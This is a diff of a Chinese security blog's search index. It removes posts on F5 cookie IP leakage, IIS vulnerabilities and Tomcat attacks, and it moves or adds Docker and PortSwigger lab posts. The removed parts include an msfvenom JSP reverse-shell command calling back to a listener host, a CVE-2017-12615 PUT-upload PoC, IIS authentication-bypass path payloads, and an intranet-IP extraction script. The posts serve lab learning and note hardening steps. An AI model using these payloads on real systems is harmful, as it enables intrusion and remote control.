class="string">"Accept-Languag"</span>] 	= <span class="string">"es-AR,en-US;q=0.7,en;q=0.3"</span></span><br><span class="line">	headers[<span class="string">"Content-Type"</span>] 	= <span class="string">"text/html"</span>	</span><br><span class="line">	headers[<span class="string">"Connection"</span>] 		= <span class="string">"close"</span></span><br><span class="line">	<span class="keyword">return</span> headers</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getCookie</span><span class="params">(srchCookName)</span>:</span></span><br><span class="line">	<span class="keyword">if</span> xSSL:</span><br><span class="line">		r1 			= 	requests.get(fullHost, headers=makeReqHeaders(HST),allow_redirects=<span class="literal">False</span>, verify=<span class="literal">False</span> )</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		r1 			= 	requests.get(fullHost, headers=makeReqHeaders(HST),allow_redirects=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">	headerSrv 	=   r1.headers[<span class="string">"Set-Cookie"</span>].split()</span><br><span class="line">	<span class="keyword">for</span> xCooks <span class="keyword">in</span> range(<span class="number">0</span>,len(headerSrv)):</span><br><span class="line"></span><br><span class="line">		srvCook = headerSrv[xCooks].split(<span class="string">"="</span>)</span><br><span class="line"></span><br><span class="line">		<span class="comment">#print " cookies "+str(srvCook[1])</span></span><br><span class="line">		<span class="keyword">if</span> srchCookName == srvCook[<span class="number">0</span>]:</span><br><span class="line">			decIp = srvCook[<span class="number">1</span>][:<span class="number">-1</span>]</span><br><span class="line">			getIP = decIp[:<span class="number">-11</span>]</span><br><span class="line">			ipLeaked = str((netaddr.IPAddress(getIP)))</span><br><span class="line">			fuck = ipLeaked.split(<span class="string">"."</span>)</span><br><span class="line">			fuck.reverse()</span><br><span class="line">			ip_final = <span class="string">''</span></span><br><span class="line">			count = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">			<span class="keyword">for</span> item <span class="keyword">in</span> fuck:</span><br><span class="line">				ip_final += item</span><br><span class="line">				<span class="keyword">if</span> count &lt; <span class="number">3</span>:</span><br><span class="line">					ip_final += <span class="string">'.'</span></span><br><span class="line">					count += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">			rawPort   	= str(srvCook[<span class="number">1</span>].split(<span class="string">"."</span>)[<span class="number">1</span>]) <span class="comment">#str(srvCook).split(".")[0]</span></span><br><span class="line">			cookieHex 	= hex(int(rawPort))[<span class="number">2</span>:]</span><br><span class="line">			portHex 	= (cookieHex[<span class="number">2</span>:] + cookieHex[:<span class="number">2</span>])</span><br><span class="line">			portDec  	= int(portHex,<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">			portX = portDec</span><br><span class="line"></span><br><span class="line">			leaked = Colors.WHITE+<span class="string">" | "</span>+Colors.GREEN + decIp +Colors.WHITE+ <span class="string">" \t | "</span>+Colors.ORANGE+ ip_final +Colors.GREEN+ <span class="string">" : "</span>+Colors.BLUE+str(portX)+Colors.DEFAULT </span><br><span class="line">			</span><br><span class="line">			<span class="keyword">return</span> leaked</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">	                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">        hCode = r1.status_code</span><br><span class="line">	<span class="comment">#return " | ----------------------------- | -------------------------"</span></span><br><span class="line">	<span class="keyword">return</span> <span class="string">" | ---------- [ "</span>+str(hCode)+<span class="string">" ] ---------- | -------------------------"</span></span><br><span class="line"></span><br><span class="line">			</span><br><span class="line"><span class="keyword">print</span> <span class="string">"\n"</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">" [+] host/ip: \t\t"</span>+HST</span><br><span class="line"><span class="keyword">print</span> <span class="string">" [+] Port: \t\t"</span>+str(port)</span><br><span class="line"><span class="keyword">print</span> <span class="string">" [+] Cookie name: \t"</span>+cookie</span><br><span class="line"><span class="keyword">print</span> <span class="string">" [+] Total Request: \t"</span>+str(loop)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">tblHead = <span class="string">'''</span></span><br><span class="line"><span class="string"> +-------------------------------+---------------------------------------+</span></span><br><span class="line"><span class="string"> | Cookie value \t\t |  &lt; '''</span>+Colors.ORANGE+<span class="string">'Host'</span>+Colors.DEFAULT+<span class="string">''' &gt; : &lt; '''</span>+Colors.BLUE+<span class="string">'Port'</span>+Colors.DEFAULT+<span class="string">''' &gt; \t\t | </span></span><br><span class="line"><span class="string"> +-------------------------------+---------------------------------------+'''</span></span><br><span class="line"> <span class="comment">#+------------------------</span></span><br><span class="line"></span><br><span class="line">tblFoot = <span class="string">''' +-------------------------------+---------------------------------------+</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="comment">#h3ader = []</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"\n"</span></span><br><span class="line">bar = Bar(<span class="string">' [+] REQUEST'</span>, max=loop )<span class="comment">#, suffix='%(percent)d%%')</span></span><br><span class="line">nReq = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,loop):</span><br><span class="line">	bar.next()</span><br><span class="line">	h3ader = getCookie(cookie)</span><br><span class="line">	</span><br><span class="line">	strHead = str(h3ader)</span><br><span class="line">	<span class="comment"># // ------------------------------------ //</span></span><br><span class="line">	<span class="comment">#if strHead == "None":</span></span><br><span class="line">	<span class="comment">#	h3ader = strHead</span></span><br><span class="line">	</span><br><span class="line"></span><br><span class="line">	time.sleep(<span class="number">.5</span>)</span><br><span class="line">	nReq.append(h3ader)</span><br><span class="line">bar.finish()</span><br><span class="line"></span><br><span class="line">listcook = set(nReq)</span><br><span class="line"><span class="keyword">print</span> tblHead</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> ck <span class="keyword">in</span> set(listcook):</span><br><span class="line">	<span class="keyword">print</span> ck</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> tblFoot</span><br></pre></td></tr></table></figure>
-
-
-
-<p><img src="/F5-LTM-leak-intranet-ip/image-20200725003355310.png" alt="image-20200725003355310"></p>
-<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p> <a href="http://blog.sina.com.cn/s/blog_165b4d5ad0102wxr1.html" target="_blank" rel="noopener">http://blog.sina.com.cn/s/blog_165b4d5ad0102wxr1.html</a> </p>
-<p> <a href="https://www.secpulse.com/archives/58730.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/58730.html</a> </p>
-<p> <a href="http://www.52bug.cn/hkjs/4771.html" target="_blank" rel="noopener">http://www.52bug.cn/hkjs/4771.html</a> </p>
-]]></content>
-  </entry>
-  <entry>
-    <title>Docker搭建私有仓库</title>
-    <url>/Docker%E6%90%AD%E5%BB%BA%E7%A7%81%E6%9C%89%E4%BB%93%E5%BA%93/</url>
-    <content><![CDATA[<p>通常由于安全和网络原因,企业内部都会在本地局域网搭建一个镜像注册中心。</p>
-<h1 id="下载和运行"><a href="#下载和运行" class="headerlink" title="下载和运行"></a>下载和运行</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker pull registry</span><br><span class="line">docker run -d -v /home/rj45/MyTest:/var/lib/registry -p 5000:5000 --restart=always --name Myregistry registry</span><br></pre></td></tr></table></figure>
-<p><img src="/Docker%E6%90%AD%E5%BB%BA%E7%A7%81%E6%9C%89%E4%BB%93%E5%BA%93/1.png" alt></p>
-<h1 id="编辑"><a href="#编辑" class="headerlink" title="编辑"></a>编辑</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vim /etc/docker/daemon.json</span><br><span class="line"></span><br><span class="line">添加：</span><br><span class="line">&quot;insecure-registries&quot;:[&quot;192.168.3.6:5000&quot;]</span><br><span class="line"></span><br><span class="line">重启：</span><br><span class="line">sudo systemctl restart docker</span><br></pre></td></tr></table></figure>
-<p><img src="/Docker%E6%90%AD%E5%BB%BA%E7%A7%81%E6%9C%89%E4%BB%93%E5%BA%93/2.png" alt></p>
-<h1 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker tag image_name:tag 192.168.3.6:5000/ubuntu/tag</span><br></pre></td></tr></table></figure>
-<p><img src="/Docker%E6%90%AD%E5%BB%BA%E7%A7%81%E6%9C%89%E4%BB%93%E5%BA%93/3.png" alt></p>
-<p><img src="/Docker%E6%90%AD%E5%BB%BA%E7%A7%81%E6%9C%89%E4%BB%93%E5%BA%93/4.png" alt></p>
-<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://www.jianshu.com/p/fef890c4d1c2" target="_blank" rel="noopener">https://www.jianshu.com/p/fef890c4d1c2</a></p>
 ]]></content>
   </entry>
   <entry>
@@ -858,50 +856,6 @@ https://websec.readthedocs.io/zh/latest/basic/http.html</code></pre></center>]]>
 ]]></content>
   </entry>
   <entry>
-    <title>IIS历史漏洞合集（有价值部分）</title>
-    <url>/IIS/</url>
-    <content><![CDATA[<h2 id="0x00-IIS"><a href="#0x00-IIS" class="headerlink" title="0x00 IIS"></a>0x00 IIS</h2><p>​    IIS是由微软公司提供的基于运行Microsoft Windows的互联网基本服务。</p>
-<p>其是一种web服务组件，其中包括WEB服务器、FTP服务器、NNTP服务器和SMTP服务器，分别用于网页浏览、文件传输、新闻服务和邮件发送等方面。</p>
-<p>目前,IIS一共发行了12个版本，从IIS1.0到IIS10.0,web市场上主要以IIS5.0到IIS10.0为主。</p>
-<p>对于IIS漏洞主要分布在缓冲区溢出、认证绕过、DOS拒绝服务、代码执行和信息泄露。</p>
-<h2 id="0x01-MS09-053-CVE-2009-3023"><a href="#0x01-MS09-053-CVE-2009-3023" class="headerlink" title="0x01 MS09-053/CVE-2009-3023"></a>0x01 MS09-053/CVE-2009-3023</h2><p>Microsoft-IIS-FTPd服务MLST命令栈缓冲区溢出漏洞</p>
-<p>影响版本：IIS5.5、IIS5.1、IIS6.0</p>
-<p>漏洞详情：IIS内嵌的FTP服务器中存在栈溢出漏洞，如果远程攻击者对带有特制名称的目录发布了包含有通配符的FTP<code>NLST</code>(name list)命令即可触发该溢出，导致拒绝服务或执行任意代码</p>
-<p>攻击手段：</p>
-<p><img src="/IIS/image-20200127204834630.png" alt="image-20200127204834630"></p>
-<p>条件：拥有写权限</p>
-<p>修补：修改NTFS文件权限或修改不允许FTP写权限或不允许FTP匿名登录或安装补丁</p>
-<h2 id="0x02-认证绕过"><a href="#0x02-认证绕过" class="headerlink" title="0x02 认证绕过"></a>0x02 认证绕过</h2><p>影响版本：IIS6.0、IIS7.5</p>
-<p>漏洞详情：对用户输入未经正确验证，攻击者可利用漏洞构造特殊数据，在服务器进程上下文中获取密码保护资源和查看源代码文件的未授权访问</p>
-<p>攻击手段：</p>
-<p>IIS6.0</p>
-<p>将<code>::$INDEX_ALLOCATION</code>后缀添加到目录名称后，如<code>/admin::$INDEX_ALLOCATION/index.php</code></p>
-<p>IIS7.5</p>
-<p>将<code>:$i30:$INDEX_ALLOCATION</code>后缀添加到目录名称后，如<code>/admin:$i30:$INDEX_ALLOCATION/index.asp</code></p>
-<h2 id="0x03-短文件名泄露"><a href="#0x03-短文件名泄露" class="headerlink" title="0x03 短文件名泄露"></a>0x03 短文件名泄露</h2><p>影响版本：IIS5.0-IIS10.0</p>
-<p>漏洞详情：Windows支持以8.3格式生成与MS-DOS兼容的（短）文件名，以允许基于MS-DOS或16位Windows的程序访问这些文件。基于Windows的IIS服务器默认根目录C:\inetpub\wwwroot下的网页脚本文件和目录符合一定条件时，会生成相应的短文件名。此时，攻击者利用HTTP的DEBUG、OPTIONS、GET、POST、HEAD、TRACE等方法携带波浪号，可以对IIS服务器短文件名进行暴力猜解，依据返回的页面信息和状态码来确认真实存在的文件名，从而获取服务器敏感信息。</p>
-<p>POC：</p>
-<p><img src="/IIS/image-20200127213534366.png" alt="image-20200127213534366"></p>
-<p>检测工具： <a href="https://github.com/lijiejie/IIS_shortname_Scanner" target="_blank" rel="noopener">https://github.com/lijiejie/IIS_shortname_Scanner</a> </p>
-<h2 id="0x04-PUT漏洞"><a href="#0x04-PUT漏洞" class="headerlink" title="0x04 PUT漏洞"></a>0x04 PUT漏洞</h2><p>漏洞详情：对IIS的错误配置导致的写权限漏洞。WEB服务器拓展里设置了<code>WebDAV</code>为允许，同时网站权限配置开启了写入权限与脚本资源访问权限。通过该PUT漏洞可以写入webshell。</p>
-<p>攻击手段： <a href="https://www.codercto.com/a/48257.html" target="_blank" rel="noopener">https://www.codercto.com/a/48257.html</a> </p>
-<h2 id="0x05-MS15-034-CVE-2015-1635"><a href="#0x05-MS15-034-CVE-2015-1635" class="headerlink" title="0x05 MS15-034/CVE-2015-1635"></a>0x05 MS15-034/CVE-2015-1635</h2><p>漏洞详情： 远程执行代码漏洞存在于 HTTP 协议堆栈 (HTTP.sys) 中，当 HTTP.sys 未正确分析经特殊设计的 HTTP 请求时会导致此漏洞。成功利用此漏洞的攻击者可以在系统帐户的上下文中执行任意代码。 </p>
-<p>攻击手段： <a href="https://www.freebuf.com/articles/system/64185.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/system/64185.html</a> </p>
-<h2 id="0x06-CVE-2017-7269"><a href="#0x06-CVE-2017-7269" class="headerlink" title="0x06 CVE-2017-7269"></a>0x06 CVE-2017-7269</h2><p> IIS远程代码执行漏洞 </p>
-<p>影响版本：IIS6.0</p>
-<p>漏洞详情：开启<code>WebDAV</code>服务的IIS 6.0被爆存在缓存区溢出漏洞导致远程代码执行，目前针对 Windows Server 2003 R2 可以稳定利用。</p>
-<p>攻击手段： <a href="https://github.com/zcgonvh/cve-2017-7269" target="_blank" rel="noopener">https://github.com/zcgonvh/cve-2017-7269</a> </p>
-<h2 id="0x07-IIS解析漏洞"><a href="#0x07-IIS解析漏洞" class="headerlink" title="0x07 IIS解析漏洞"></a>0x07 IIS解析漏洞</h2><p>影响版本：IIS5.0-6.0、IIS7.0</p>
-<p>漏洞详情：</p>
-<p>1、IIS5.0-6.0下，如果一个目录以”xxx.asp”的形式命名，那么该目录下的所有类型文件都会被当做asp文件来进行解析执行</p>
-<p>2、IIS5.0-6.0下，如果一个文件的扩展名采用”.asp;*.jpg”的形式，那么该文件也会被当做asp文件解析执行 </p>
-<p>3、IIS70下，如果php.ini中的cgi.cgi_pathinfo=1同时IIS7.0在Fast-CGI运行模式下，则可以在恶意文件后面添加<code>/.php</code>使得其解析为php。如<code>http://192.168.61.141/789.jpg/.php</code></p>
-<p>参考链接：</p>
-<p> <a href="https://www.cnblogs.com/baifan2618/p/7704678.html" target="_blank" rel="noopener">https://www.cnblogs.com/baifan2618/p/7704678.html</a> </p>
-<p> <a href="https://blog.csdn.net/nzjdsds/article/details/96989492" target="_blank" rel="noopener">https://blog.csdn.net/nzjdsds/article/details/96989492</a> </p>
-]]></content>
-  </entry>
-  <entry>
     <title>Kioptrix_Level_1靶机渗透</title>
     <url>/Kioptrix-Level-1%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/</url>
     <content><![CDATA[<h2 id="主机存活"><a href="#主机存活" class="headerlink" title="主机存活"></a>主机存活</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">netdiscover</span><br></pre></td></tr></table></figure>
@@ -982,68 +936,6 @@ https://websec.readthedocs.io/zh/latest/basic/http.html</code></pre></center>]]>
 ]]></content>
   </entry>
   <entry>
-    <title>attack-to-tomcat</title>
-    <url>/attack-to-tomcat/</url>
-    <content><![CDATA[<h2 id="0x00-tomcat"><a href="#0x00-tomcat" class="headerlink" title="0x00  tomcat"></a>0x00  tomcat</h2><p>tomcat服务器是一个免费开源的轻量级web应用服务器，是开发和调试jsp程序的首选。</p>
-<p>其是apache服务器的扩展，但运行时进程是独立于apache的。</p>
-<h2 id="0x01-实验环境"><a href="#0x01-实验环境" class="headerlink" title="0x01 实验环境"></a>0x01 实验环境</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vulhub项目之tomcat</span><br></pre></td></tr></table></figure>
-
-<h2 id="0x02-后台上传webshell"><a href="#0x02-后台上传webshell" class="headerlink" title="0x02 后台上传webshell"></a>0x02 后台上传webshell</h2><p>1、漏洞摘要：</p>
-<p>tomcat服务器默认支持远程部署war包的方式上线应用。但也正是如此，如果被黑客利用，则可以直接部署jsp的webshell。</p>
-<p>2、利用条件：</p>
-<p>tomcat服务器默认后台路径是<code>manager/html</code>，然而其默认是没有用户有权限访问该目录的，需要手动配置，修改<code>conf/tomcat-user.xml</code>，添加规则和用户，然后重启tomcat：</p>
-<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">role</span> <span class="attr">rolename</span>=<span class="string">"manager-gui"</span> /&gt;</span> #设置规则名，manager-gui拥有web管理权限</span><br><span class="line"><span class="tag">&lt;<span class="name">user</span> <span class="attr">username</span>=<span class="string">"tomcat"</span> <span class="attr">password</span>=<span class="string">"tomcat"</span> <span class="attr">roles</span>=<span class="string">"manager-gui"</span> /&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>该规则是基于<code>http basic</code>认证的。</p>
-<p>如果设置了弱密码，则可以通过爆破的方式获取到账户，从而登录到后台。</p>
-<p>3、利用过程：</p>
-<ol>
-<li><p>登录后台</p>
-<p><img src="/attack-to-tomcat/image-20200209192957819.png" alt="image-20200209192957819"></p>
-</li>
-<li><p>生成webshell，上传到后台</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msfvenom -p java/jsp_shell_reverse_tcp lhost=192.168.3.59 lport=4444 -f war -o shell.war</span><br></pre></td></tr></table></figure>
-
-<p><img src="/attack-to-tomcat/image-20200209202148953.png" alt="image-20200209202148953"></p>
-</li>
-<li><p>监听并触发接收webshell</p>
-<p><img src="/attack-to-tomcat/image-20200209212510996.png" alt="image-20200209212510996"></p>
-</li>
-</ol>
-<p>4、加固方式：</p>
-<ul>
-<li>编辑<code>conf/tomcat-user.xml</code>，设置强密码，重启tomcat</li>
-<li>删除管理后台<code>webapps/manger</code>文件夹</li>
-</ul>
-<h2 id="0x03-CVE-2017-12615"><a href="#0x03-CVE-2017-12615" class="headerlink" title="0x03 CVE-2017-12615"></a>0x03 CVE-2017-12615</h2><p>1、漏洞摘要：</p>
-<p>在tomcat的配置文件<code>conf/web.xml</code>中，<code>readonly</code>参数设置了<code>false</code>，</p>
-<p>导致可以通过<code>PUT</code>方式创建jsp文件，从而执行任意代码。</p>
-<p>2、影响版本：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Apache Tomcat 7.0.0 - 7.0.81</span><br></pre></td></tr></table></figure>
-
-<p>3、分析过程：</p>
-<ol>
-<li><p>配置文件中，<code>readonly</code>默认为true，当设置为false时，可以通过<code>PUT或DELETE</code>方式操控文件</p>
-<p><img src="/attack-to-tomcat/image-20200209214603859.png" alt="image-20200209214603859"></p>
-<ol start="2">
-<li><p>Linux下利用方式：</p>
-<p><img src="/attack-to-tomcat/image-20200209222146900.png" alt="image-20200209222146900"></p>
-</li>
-<li><p>Win下利用方式：</p>
-<p><img src="/attack-to-tomcat/image-20200209215955147.png" alt="image-20200209215955147"></p>
-<p>或者</p>
-<p><img src="/attack-to-tomcat/image-20200209220041654.png" alt="image-20200209220041654"></p>
-</li>
-</ol>
-</li>
-</ol>
-<p>4、PoC：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pocsuite3.api <span class="keyword">import</span> Output,POCBase,register_poc,requests</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PoC</span><span class="params">(POCBase)</span>:</span></span><br><span class="line">    vulID=<span class="string">'1'</span></span><br><span class="line">    version=<span class="string">'1'</span></span><br><span class="line">    author=<span class="string">'Rj45mp'</span></span><br><span class="line">    vulDate=<span class="string">''</span></span><br><span class="line">    createDate=<span class="string">''</span></span><br><span class="line">    updateDate=<span class="string">''</span></span><br><span class="line">    references=[<span class="string">''</span>]</span><br><span class="line">    name=<span class="string">'tomcat'</span></span><br><span class="line">    appPowerLink=<span class="string">'test'</span></span><br><span class="line">    appName=<span class="string">'tomcat'</span></span><br><span class="line">    appVersion=<span class="string">'7.0.0 - 7.0.81'</span></span><br><span class="line">    vulType=<span class="string">'PUT FILE'</span></span><br><span class="line">    desc=<span class="string">'PUT FILE'</span></span><br><span class="line">    samples=[<span class="string">'http://127.0.0.1'</span>]</span><br><span class="line">    install_requires=[]</span><br><span class="line">    pocDesc=<span class="string">'Rj45mp for test.'</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_verify</span><span class="params">(self)</span>:</span></span><br><span class="line">        result=&#123;&#125;</span><br><span class="line">        target=self.url</span><br><span class="line">        payload = <span class="string">'&lt;%out.print("Rj45");%&gt;'</span></span><br><span class="line">        requests.put(target+<span class="string">'/2.jsp'</span>,data=payload)</span><br><span class="line">        req=requests.get(target+<span class="string">'/2.jsp'</span>)</span><br><span class="line">        res = req.text</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">"Rj45"</span> <span class="keyword">in</span> res):</span><br><span class="line">            result[<span class="string">'VerifyInfo'</span>]=&#123;&#125;</span><br><span class="line">            result[<span class="string">'VerifyInfo'</span>][<span class="string">'URL'</span>]=target</span><br><span class="line">        <span class="keyword">return</span> self.parse_output</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_attack</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self._verify()</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">parse_output</span><span class="params">(self,result)</span>:</span></span><br><span class="line">        output=Output(self)</span><br><span class="line">        <span class="keyword">if</span> result:</span><br><span class="line">            output.success(result)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            output.fail(<span class="string">'target is not vulnerable.'</span>)</span><br><span class="line">        <span class="keyword">return</span> output</span><br><span class="line">register_poc(PoC)</span><br></pre></td></tr></table></figure>
-
-<p><img src="/attack-to-tomcat/image-20200209224712961.png" alt="image-20200209224712961"></p>
-]]></content>
-  </entry>
-  <entry>
     <title>不死马的创建和查杀</title>
     <url>/bushima/</url>
     <content><![CDATA[<h2 id="0x00-创建"><a href="#0x00-创建" class="headerlink" title="0x00 创建"></a>0x00 创建</h2><p>md5加密密码：</p>
@@ -1099,22 +991,6 @@ https://websec.readthedocs.io/zh/latest/basic/http.html</code></pre></center>]]>
 ]]></content>
   </entry>
   <entry>
-    <title>docker搭建typecho博客系统</title>
-    <url>/docker%E6%90%AD%E5%BB%BAtypecho%E5%8D%9A%E5%AE%A2%E7%B3%BB%E7%BB%9F/</url>
-    <content><![CDATA[<p>世界上最难受的问题就是我尝试了5到6次用docker搭建wordpress都失败了。<br>所以，安排上了typecho。<br>为啥要搭建一个博客系统呢？</p>
-<p>首先声明一下<a href="https://rj45mp.github.io/">Rj45mp</a>仍是我的文章输出。<br>这个typecho的开始，是为啥呢？<br>一是为了玩一下docker。<br>二是来自对wordpress的gg。<br>三也是主要理由：<br>19师弟师妹们快来学校了，E神昨晚和我聊说，准备开学进行队内集训。队长也说开学要安排队伍的。<br>估计我会尝试一下培训MISC和入门pwn<del>菜鸡Rj45</del><br>我打算将一直以来打过的所有的MISC题都重新打一遍，然后写一下wp,还有MISC题总结到博客里面。这样一想，<a href="https://rj45mp.github.io/">Rj45mp</a>得太多wp文章了。<del>不太愿意</del><br>所以有了typecho。</p>
-<p>另希望我们的CTF战队可以慢慢建立发展得更好。<br>还有最近在进行两周的华三网络集成实训，希望这两周我的任务计划可以平安完成。</p>
-<h1 id="查询镜像"><a href="#查询镜像" class="headerlink" title="查询镜像"></a>查询镜像</h1><p><img src="/docker%E6%90%AD%E5%BB%BAtypecho%E5%8D%9A%E5%AE%A2%E7%B3%BB%E7%BB%9F/1.png" alt></p>
-<h1 id="拉取镜像"><a href="#拉取镜像" class="headerlink" title="拉取镜像"></a>拉取镜像</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker pull yangxuan8282/typecho</span><br></pre></td></tr></table></figure>
-
-<h1 id="运行镜像"><a href="#运行镜像" class="headerlink" title="运行镜像"></a>运行镜像</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mkdir typecho</span><br><span class="line">cd typecho</span><br><span class="line">docker run -d -p 80:80 --name Rj45_typecho -v &quot;$PWD&quot;:/var/www/html yangxuan8282/typecho</span><br></pre></td></tr></table></figure>
-<p><img src="/docker%E6%90%AD%E5%BB%BAtypecho%E5%8D%9A%E5%AE%A2%E7%B3%BB%E7%BB%9F/2.png" alt></p>
-<h1 id="访问"><a href="#访问" class="headerlink" title="访问"></a>访问</h1><p><img src="/docker%E6%90%AD%E5%BB%BAtypecho%E5%8D%9A%E5%AE%A2%E7%B3%BB%E7%BB%9F/3.png" alt></p>
-<p>接下来就是配置和优化了。</p>
-<p><img src="/docker%E6%90%AD%E5%BB%BAtypecho%E5%8D%9A%E5%AE%A2%E7%B3%BB%E7%BB%9F/4.png" alt></p>
-]]></content>
-  </entry>
-  <entry>
     <title>docker搭建frp实现内网穿透</title>
     <url>/docker%E6%90%AD%E5%BB%BAfrp%E5%AE%9E%E7%8E%B0%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/</url>
     <content><![CDATA[<p>一直以来都很羡慕PushEax的工作模式<br>【一台物理服务器+一个公网ip+一个域名】，做个内网穿透<br>然后随时随地远程桌面回去工作，不用像我这样每天背着几斤重的笔记本。<br>特别是今天中午，特别酸。<br>下午和傍晚上课的时候，特地搞了一下怎么玩frp的，这里记录一下。</p>
@@ -1140,6 +1016,22 @@ https://websec.readthedocs.io/zh/latest/basic/http.html</code></pre></center>]]>
 <h1 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h1><p>客户端创建账户并添加到远程桌面组：<br><img src="/docker%E6%90%AD%E5%BB%BAfrp%E5%AE%9E%E7%8E%B0%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/6.png" alt></p>
 <p>第三方pc测试：<br><img src="/docker%E6%90%AD%E5%BB%BAfrp%E5%AE%9E%E7%8E%B0%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/7.png" alt></p>
 <p>接下来直接通过远程桌面+域名就可以愉快的工作了。</p>
+]]></content>
+  </entry>
+  <entry>
+    <title>docker搭建typecho博客系统</title>
+    <url>/docker%E6%90%AD%E5%BB%BAtypecho%E5%8D%9A%E5%AE%A2%E7%B3%BB%E7%BB%9F/</url>
+    <content><![CDATA[<p>世界上最难受的问题就是我尝试了5到6次用docker搭建wordpress都失败了。<br>所以，安排上了typecho。<br>为啥要搭建一个博客系统呢？</p>
+<p>首先声明一下<a href="https://rj45mp.github.io/">Rj45mp</a>仍是我的文章输出。<br>这个typecho的开始，是为啥呢？<br>一是为了玩一下docker。<br>二是来自对wordpress的gg。<br>三也是主要理由：<br>19师弟师妹们快来学校了，E神昨晚和我聊说，准备开学进行队内集训。队长也说开学要安排队伍的。<br>估计我会尝试一下培训MISC和入门pwn<del>菜鸡Rj45</del><br>我打算将一直以来打过的所有的MISC题都重新打一遍，然后写一下wp,还有MISC题总结到博客里面。这样一想，<a href="https://rj45mp.github.io/">Rj45mp</a>得太多wp文章了。<del>不太愿意</del><br>所以有了typecho。</p>
+<p>另希望我们的CTF战队可以慢慢建立发展得更好。<br>还有最近在进行两周的华三网络集成实训，希望这两周我的任务计划可以平安完成。</p>
+<h1 id="查询镜像"><a href="#查询镜像" class="headerlink" title="查询镜像"></a>查询镜像</h1><p><img src="/docker%E6%90%AD%E5%BB%BAtypecho%E5%8D%9A%E5%AE%A2%E7%B3%BB%E7%BB%9F/1.png" alt></p>
+<h1 id="拉取镜像"><a href="#拉取镜像" class="headerlink" title="拉取镜像"></a>拉取镜像</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker pull yangxuan8282/typecho</span><br></pre></td></tr></table></figure>
+
+<h1 id="运行镜像"><a href="#运行镜像" class="headerlink" title="运行镜像"></a>运行镜像</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mkdir typecho</span><br><span class="line">cd typecho</span><br><span class="line">docker run -d -p 80:80 --name Rj45_typecho -v &quot;$PWD&quot;:/var/www/html yangxuan8282/typecho</span><br></pre></td></tr></table></figure>
+<p><img src="/docker%E6%90%AD%E5%BB%BAtypecho%E5%8D%9A%E5%AE%A2%E7%B3%BB%E7%BB%9F/2.png" alt></p>
+<h1 id="访问"><a href="#访问" class="headerlink" title="访问"></a>访问</h1><p><img src="/docker%E6%90%AD%E5%BB%BAtypecho%E5%8D%9A%E5%AE%A2%E7%B3%BB%E7%BB%9F/3.png" alt></p>
+<p>接下来就是配置和优化了。</p>
+<p><img src="/docker%E6%90%AD%E5%BB%BAtypecho%E5%8D%9A%E5%AE%A2%E7%B3%BB%E7%BB%9F/4.png" alt></p>
 ]]></content>
   </entry>
   <entry>
@@ -2421,6 +2313,187 @@ https://websec.readthedocs.io/zh/latest/basic/http.html</code></pre></center>]]>
 ]]></content>
   </entry>
   <entry>
+    <title>portswigger-Authentication</title>
+    <url>/portswigger-Authentication/</url>
+    <content><![CDATA[<h1 id="portswigger-Authentication-上"><a href="#portswigger-Authentication-上" class="headerlink" title="portswigger-Authentication-上"></a>portswigger-Authentication-上</h1><h3 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h3><p><img src="/portswigger-Authentication/image-20200804130338623.png" alt="image-20200804130338623"></p>
+<p>portswigger，一个关于burpsuite的靶场，burpsuite对于web安全的重要性不言而喻。</p>
+<p>前面几天已经写了第一部分的Information disclosure信息泄露内容。</p>
+<p><img src="/portswigger-Authentication/image-20200804131122758.png" alt="image-20200804131122758"></p>
+<p>下面就第二部分的Authentication，即认证方面进行简单记录关卡过程。</p>
